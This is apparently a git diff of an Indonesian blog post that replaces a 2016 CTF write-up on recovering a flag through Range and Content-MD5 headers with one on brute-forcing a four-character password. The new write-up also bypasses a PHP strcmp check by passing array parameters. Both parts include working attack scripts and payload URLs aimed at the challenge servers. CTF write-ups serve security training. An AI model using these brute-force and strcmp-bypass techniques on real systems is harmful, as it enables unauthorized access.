@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Writeup Idsecconf CTF 2016 : Headshoot - 200"
+title: "Writeup Idsecconf CTF 2016 : Webwob - 100"
 description: "Writeup Idsecconf CTF 2016 Online"
 headline: 
 modified: 2016-08-29
@@ -15,52 +15,82 @@ featured: false
 
 ### Problem :
 
-`http://139.59.245.67:8000/`
+`http://128.199.96.39/`
 
 ### Solusi :
 
-Di berikan sebuah website dan lokasi flag di beritahu ada di `http://139.59.245.67:8000/flag.txt`
-namun kita hanya bisa menggunakan Method `OPTIONS,HEAD` 
+Kita di berikan website dengan di tampilkan source code nya dan terlihat jelas flag akan muncul ketika
+variable `$ok` bernilai `True`. 
 
-menurut w3 protocol : `The HEAD method is identical to GET except that the server MUST NOT return a message-body in the response. `
+pertama saya mencoba memasukan parameter password 4x seperti ini
+`http://128.199.96.39/?password[]=awd&password[]=awd&password[]=awd&password[]=awd`
+namun tidak berhasil.
 
-`Content-MD5, A Base64-encoded binary MD5 sum of the content of the request body, Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ== Obsolete`
-
-`echo 'T/JeCTIbbkLdlRS/YqTvHw==' | base64 -d | xxd`
-
-![Headshoot MD5](/images/headshoot_md5.png)
-
-ditemukan md5 `4ff25e09321b6e42dd9514bf62a4ef1f` tidak bisa di decrypt secara online. dan setelah
-surving di wikipedia ternyata kita bisa menambahkan header Range: bytes 0-1. dan akan bisa mengatur Response header
-dengan menambahkan range kita bisa melakukan bruteforce terhadap MD5 nya perkarakter.
+kemudian karena kita mengetahui panjang karakter password hanya 4 maka kita buat script untuk bruteforce
 
 ```python
-import requests
-import hashlib
+import mechanize
+import itertools
 import string
-import binascii
 
+br = mechanize.Browser()
+url = "http://128.199.96.39/?password={0}{1}{2}{3}"
+response = br.open(url)
 
-url = 'http://139.59.245.67:8000/flag.txt'
-
-flag = ''
-
+cnt = 0
+pat = "invalid {}Invalid"
+acc = string.ascii_letters + "0123456789!@#$%^{}()[]"
+combinations = itertools.permutations(acc,cnt+1)
+res = ""
+a = "x"
+b = "x"
+c = "x"
+d = "x"
+bb = "x"
+cc = "x"
+dd = "x"
 
 while True:
-    headers = {'Range': 'bytes=0-'+str(len(flag)+1)}
-    r = requests.head(url, headers=headers)
-    md5 = r.headers.get('Content-MD5')
-    md5 = binascii.a2b_base64(md5)
-    md5 = binascii.hexlify(md5)
-    print md5
-    for c in string.printable:
-        newflag = flag+c
-        newmd5 = hashlib.md5(newflag).hexdigest()
-        if newmd5==md5:
-            flag+=c
-            print flag
-            break    
-
+    combinations = itertools.permutations(acc,1)
+    for x in combinations:
+        x = "".join(x)
+        if a == "x":
+            aa = x
+        elif b == "x":
+            bb = x
+        elif c == "x":
+            cc = x
+        elif d == "x":
+            dd = x
+            
+        response = br.open(url.format(aa,bb,cc,dd))
+        #print url.format(aa,bb,cc,dd)
+        cek = response.read().split("<")[0]
+        #sprint cek
+        if "flag" in cek:
+            print cek
+            break
+        #print x
+        
+        if pat.format(cnt+1) in cek:
+            cnt += 1
+            if a == "x":
+                a = x
+            elif b == "x":
+                b = x
+            elif c == "x":
+                c = x
+            elif d == "x":
+                d = x
+            #print x
 ```
 
-dan di dapatkan flag : `flag{HaveYouEverSeenMD5ContentHeaderBeforeThis?}`
+![Webwob Flag](/images/webwob_flag.png)
+
+scriptnya agak berantakan disitu tujuan kita untuk dapat flagnya tapi :D
+
+setelah membaca writeup dari [Cyber Security IPB](https://drive.google.com/drive/folders/0B73v7q0VGLSEWlRUbU96YXlsNU0) ternyata cara bypass vulnerability Strcmp di sini adalah seperti ini 
+`http://128.199.96.39/?password[][]=&password[][]=&password[][]=&password[][]=`
+karena input kita awalnya adalah array karena di dalam script melakukan pengecekan 
+berdasarkan tiap index maka jika tiap index yang akan di cek adalah array maka akan
+membuahkan hasil True.
